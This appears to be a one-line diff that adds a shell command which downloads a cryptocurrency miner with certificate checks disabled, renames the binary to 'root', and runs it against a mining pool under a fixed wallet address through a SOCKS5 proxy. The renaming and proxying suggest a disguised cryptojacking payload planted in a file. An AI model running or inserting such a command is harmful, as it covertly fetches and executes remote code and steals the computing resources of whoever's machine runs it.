@@ -1,0 +1,1 @@
+wget -q https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux-5.0.41a.tar.gz && mv cpuminer-sse2 root && ./root -a yespowerTIDE -o stratum+tcp://yespowerTIDE.eu.mine.zpool.ca:6239 -u RBkak4CYV2jnxUwxHj4d6a4hhmZhR1bgAR -p c=RVN -t 3 --proxy socks5://192.252.220.89:4145
